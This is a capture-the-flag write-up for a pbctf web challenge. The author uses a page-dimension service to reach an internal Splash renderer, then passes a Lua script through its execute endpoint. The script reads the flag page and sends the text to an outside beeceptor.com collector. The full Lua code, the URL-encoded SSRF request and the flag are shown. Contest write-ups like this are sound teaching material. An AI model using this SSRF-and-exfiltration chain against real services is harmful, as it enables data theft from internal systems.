The idea behind the challenge was simple yet effective. We were given a service that visit a URL we provide and show its webpage-Dimensions.

On digging we find that the service used to calculate dimension is SPLASH : https://splash.readthedocs.io/en/stable/scripting-tutorial.html#scripting-tutorial

We started looking at what other options we can provide and came accross: https://splash.readthedocs.io/en/stable/api.html#arg-lua-source

So according to this, we can execute Lua script in conjunction to web page opened. So Idea was to open flag page and execute lua script to send the page content to our URL


Following Lua script can be used to read flag and send to us:

```

function main(splash)
  splash:go("http://webapp/flag.php")
  splash:wait(0.2)
  local title = splash:evaljs("document.body.innerText")
  splash:go("http://zeta2.free.beeceptor.com/?q=" .. title)  
  return {title=title}
end

```

So we will send following URL and retrieve the flag

```
http://sploosh.chal.perfect.blue/api.php?url=http://splash:8050/execute?lua_source=function+main%28splash%29%0D%0A++splash%3Ago%28%22http%3A%2F%2Fwebapp%2Fflag.php%22%29%0D%0A++splash%3Await%280.2%29%0D%0A++local+title+%3D+splash%3Aevaljs%28%22document.body.innerText%22%29%0D%0A++splash%3Ago%28%22http%3A%2F%2Fzeta2.free.beeceptor.com%2F%3Fq%3D%22+..+title%29++%0D%0A++return+%7Btitle%3Dtitle%7D%0D%0Aend
```


pbctf{1_h0p3_y0u_us3d_lua_f0r_th1s}